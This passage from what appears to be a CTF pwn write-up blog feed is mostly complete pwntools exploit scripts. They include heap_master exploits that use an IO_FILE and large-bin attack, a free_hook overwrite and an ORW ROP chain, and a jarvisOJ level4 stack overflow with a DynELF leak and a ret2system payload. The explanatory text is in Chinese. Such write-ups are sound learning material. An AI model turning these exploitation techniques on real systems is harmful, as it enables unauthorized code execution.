class="number">0x110</span>)</span><br><span class="line">    <span class="comment">#fake vtable</span></span><br><span class="line">    Edit(<span class="number">0x190</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x121</span>))</span><br><span class="line">    Edit(<span class="number">0x190</span>+<span class="number">0x120</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(<span class="number">0x190</span>+<span class="number">0x120</span>+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Delete(<span class="number">0x190</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x120</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#change global max fast</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x17e0</span>+<span class="number">0x20</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x17e0</span>+<span class="number">0x20</span>+<span class="number">0x10</span>+<span class="number">8</span>,p16(global_max_fast<span class="number">-0x10</span>))</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0xe0</span>)</span><br><span class="line">    <span class="comment">###</span></span><br><span class="line">    Edit(<span class="number">0x100</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x118</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p16(<span class="number">0x18e0</span>))</span><br><span class="line">    Edit(<span class="number">0x140</span>,p64(<span class="number">1</span>)+p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0xa000000</span>)+p16(<span class="number">0x3780</span>))</span><br><span class="line">    Edit(<span class="number">0x160</span>,p64(<span class="number">0xffffffffffffffff</span>)+p64(<span class="number">0</span>))</span><br><span class="line">    Edit(<span class="number">0x1a8</span>,p16(<span class="number">0x6e0</span>))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">0x90</span>+<span class="number">0x20</span>+<span class="number">0x20</span>+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p.recvn(<span class="number">0x18</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd06e0</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(<span class="number">0xf0</span>,p64(libc_base+<span class="number">0x3c5708</span>)+p64(libc_base+<span class="number">0x3c5710</span>))</span><br><span class="line"></span><br><span class="line">    map_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0xd0</span></span><br><span class="line">    log.success(<span class="string">"map addr =&gt; "</span> + hex(map_addr))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#same way to overwrite IO_list_all to mmap_addr</span></span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x200</span></span><br><span class="line">    Edit(offset+<span class="number">8</span>,p64(<span class="number">0x1411</span>))</span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x1410</span>+<span class="number">8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x1410</span>+<span class="number">0x20</span>+<span class="number">8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#IO_list_all</span></span><br><span class="line">    <span class="comment">#hajack map addr to</span></span><br><span class="line">    IO_str_j = libc_base + libc.sym[<span class="string">'_IO_file_jumps'</span>]+<span class="number">0xc0</span></span><br><span class="line">    morecore = libc_base + libc.sym[<span class="string">'__morecore'</span>] - <span class="number">8</span> - <span class="number">0xa0</span></span><br><span class="line">    setcontext = libc_base + libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span></span><br><span class="line">    _IO_FILE = ( p64(<span class="number">0</span>) +</span><br><span class="line">		     p64(<span class="number">0</span>)*<span class="number">3</span> +</span><br><span class="line">		     p64(<span class="number">0</span>) +                     <span class="comment"># write_base</span></span><br><span class="line">		     p64(<span class="number">0x7fffffffffffffff</span>) +    <span class="comment"># write_ptr</span></span><br><span class="line">		     p64(<span class="number">0xdadaddaaddddaaaa</span>) +</span><br><span class="line">		     p64(<span class="number">0</span>) +                     <span class="comment"># buf_base</span></span><br><span class="line">		     p64((morecore - <span class="number">100</span>) / <span class="number">2</span>) +  <span class="comment">#  rdi   buf_end</span></span><br><span class="line">		     p64(<span class="number">0xdadaddaaddddaaaa</span>)*<span class="number">11</span> +</span><br><span class="line">		     p64(<span class="number">0</span>) + <span class="comment"># + 0xa8</span></span><br><span class="line">		     p64(<span class="number">0xdadaddaaddddaaaa</span>)*<span class="number">6</span> +</span><br><span class="line">		     p64(IO_str_j) +          <span class="comment"># + 0xd8</span></span><br><span class="line">		     p64(setcontext))</span><br><span class="line">    Edit(offset,_IO_FILE)</span><br><span class="line">    offset = <span class="number">0x600</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">8</span>,p64(<span class="number">0x1120</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x1120</span>+<span class="number">8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x1120</span>+<span class="number">0x20</span>+<span class="number">8</span>,p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p_rdi = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">    p_rdx_rsi = libc_base + <span class="number">0x00000000001150c9</span></span><br><span class="line">    p_rax = libc_base + <span class="number">0x0000000000033544</span></span><br><span class="line">    syscall = libc_base + <span class="number">0x00000000000bc375</span></span><br><span class="line">    Edit(<span class="number">0x400</span>,<span class="string">'./flag\x00\x00'</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    orw = [</span><br><span class="line">            p_rdi,map_addr+<span class="number">0x400</span>,</span><br><span class="line">            p_rdx_rsi,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">            p_rax,<span class="number">2</span>,</span><br><span class="line">            syscall,</span><br><span class="line">            p_rdi,<span class="number">3</span>,</span><br><span class="line">            p_rdx_rsi,<span class="number">0x30</span>,map_addr+<span class="number">0x100</span>,</span><br><span class="line">            p_rax,<span class="number">0</span>,</span><br><span class="line">            syscall,</span><br><span class="line">            p_rdi,<span class="number">1</span>,</span><br><span class="line">            p_rdx_rsi,<span class="number">0x30</span>,map_addr+<span class="number">0x100</span>,</span><br><span class="line">            p_rax,<span class="number">1</span>,</span><br><span class="line">            syscall</span><br><span class="line">    ]</span><br><span class="line">    Edit(offset,flat(orw))</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    Exit()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="fatbinY-py"><a href="#fatbinY-py" class="headerlink" title="fatbinY.py"></a>fatbinY.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK):</span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK):</span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK):</span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)</span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path))</span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x2620</span></span><br><span class="line">    elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x5600</span></span><br><span class="line">    elf = change_ld(<span class="string">"./heap_master"</span>,<span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">    p = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    offset = <span class="number">0x8800</span><span class="number">-0x7a0</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set two main_arena addr</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>+<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#recover</span></span><br><span class="line">    <span class="comment">#Edit(0x330+0x30,p64(0)+p64(0x411))#2 again</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0x3f0</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x8</span>,p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p16(stdout_addr<span class="number">-0x10</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x18</span>+<span class="number">0x8</span>,p64(<span class="number">0</span>)+p16(stdout_addr+<span class="number">0x19</span><span class="number">-0x20</span>))</span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p.recvn(<span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd06e0</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">        <span class="comment">#map</span></span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0xc13b1800</span><span class="number">-0xc13a9000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd5683</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    log.success(<span class="string">"map addr =&gt; "</span> + hex(map_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="comment">#large bin attack change free_hook to map_addr</span></span><br><span class="line">    <span class="comment">#also can be implemented by just free</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line">    libc.address =  libc_base</span><br><span class="line">    io_list_all = libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(io_list_all<span class="number">-0x20</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    io_heap_addr = map_addr + offset + <span class="number">0x8a0</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="comment">#ub to change global max fast</span></span><br><span class="line">    Edit(<span class="number">0x82e0</span>+<span class="number">0x18</span>,p64(libc_base+(<span class="number">0x7ffff7dd37f8</span><span class="number">-0x7ffff7a0d000</span>)<span class="number">-0x10</span>))</span><br><span class="line">    Add(<span class="number">0xa0</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#calc size</span></span><br><span class="line">    main_arena = libc.sym[<span class="string">'__malloc_hook'</span>]+<span class="number">0x10</span></span><br><span class="line">    idx = (libc.sym[<span class="string">'__free_hook'</span>]-(main_arena+<span class="number">8</span>))/<span class="number">8</span></span><br><span class="line">    size = idx*<span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0x8a0</span>,p64(<span class="number">0</span>)+p64(size+<span class="number">1</span>)+p64(libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    Edit(<span class="number">0x8a0</span>+size,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    Edit(<span class="number">0x8a0</span>+size+<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">    Add(size<span class="number">-0x10</span>)</span><br><span class="line">    Delete(<span class="number">0x8a0</span>+size+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>StartCTF 2019</category>
      </categories>
  </entry>
  <entry>
    <title>jarvisOj-level4</title>
    <url>/2020/09/03/jarvisOj-level4/</url>
    <content><![CDATA[<h1 id="jarvis-gt-level4"><a href="#jarvis-gt-level4" class="headerlink" title="jarvis-&gt;level4"></a>jarvis-&gt;level4</h1><h2 id="代码逻辑"><a href="#代码逻辑" class="headerlink" title="代码逻辑"></a>代码逻辑</h2><p>程序本身很简单，使用F5转换成C代码，有一个vlunerable_function(),里面是很明显的栈溢出</p>
<p><img src="/2020/09/03/jarvisOj-level4/1.jpg" alt="code"><br><img src="/2020/09/03/jarvisOj-level4/2.jpg" alt="code2"></p>
<p>查看程序的保护措施，发现只有栈不可执行保护，这意味着不能在栈上执行代码。</p>
<p><img src="/2020/09/03/jarvisOj-level4/3.jpg" alt="protection"></p>
<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>整体的思路比较简单，溢出之后在return addr填上system函数地址，之后跟fake ebp和’/bin/sh’的地址即可，但是在调试过程中发现程序中并没有现成的地址，因此要想办法自己获取Libc中的地址</p>
<p><img src="/2020/09/03/jarvisOj-level4/4.jpg" alt="info"></p>
<p>由于题目中没有给libc，我开始使用的是一个库Libcsearcher，基于libcdatabase，但是事实证明不太好使，找不到对应的libc，也可能是我使用姿势不对，之后想到用pwntools自带的DynELF配合leak得到system函数的地址，之后使用read将’/bin/sh’写入.bss段中，调用system(‘.bss_addr’)即可拿到shell</p>
<p>代码里的leak函数是使用一种持续化泄露函数地址的方式讲指定的address输出出来，借此找到libc,后面的payload是使用read从用户输入中获取’/bin/sh’，之后三个pop将栈里的read三个参数都弹出栈，到ret的时候esp就是system_addr，它的参数是bss段的地址(可以用IDA查看)</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'i386'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"info"</span>)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    sh = process(<span class="string">'./level4'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    padding = <span class="string">'A'</span> * <span class="number">0x8c</span></span><br><span class="line">    write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">    vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">    payload = padding + p32(write_plt) + p32(vulnearbale_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./level4'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">bss_addr = <span class="number">0x0804A024</span></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ret = <span class="number">0x08048509</span></span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">0x8C</span></span><br><span class="line">vulnearbale_addr = elf.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">payload = padding + p32(read_plt) + p32(pop_ret) +p32(<span class="number">0</span>) + p32(bss_addr)\</span><br><span class="line">        + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulnearbale_addr) +p32(bss_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>jarvisOj</category>
      </categories>
  </entry>
  <entry>
    <title>湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup</title>
    <url>/2020/09/03/hxb_jjj_axb_swpuctf/</url>
    <content><![CDATA[<h1 id="湖湘杯决赛-TCTF2019-京津冀线下-安洵杯线上-SWPUCTF-部分pwn-writeup"><a href="#湖湘杯决赛-TCTF2019-京津冀线下-安洵杯线上-SWPUCTF-部分pwn-writeup" class="headerlink" title="湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup"></a>湖湘杯决赛/TCTF2019/京津冀线下/安洵杯线上/SWPUCTF 部分pwn writeup</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在越来越懒得更博客了，趁着还没到考试周把前段时间做的题记录一下，分别是湖湘杯AWD，京津冀线下，安洵杯的一道heap和SWPUCTF。</p>
<h2 id="湖湘杯"><a href="#湖湘杯" class="headerlink" title="湖湘杯"></a>湖湘杯</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>libc为2.23，保护全开，一共有四个功能，Store，Delete，Post和Exit，输入错误选项会调用<code>_fprintf_chk(stderr, 1LL, &quot;unknown options, foolish %s&quot;, byte_202100);</code></p>
<p>Store是在bss上新建一个node，每个node包括chunk_addr，in_use，size等内容，固定分配0x68大小的chunk，chunk_size为输入的长度。</p>
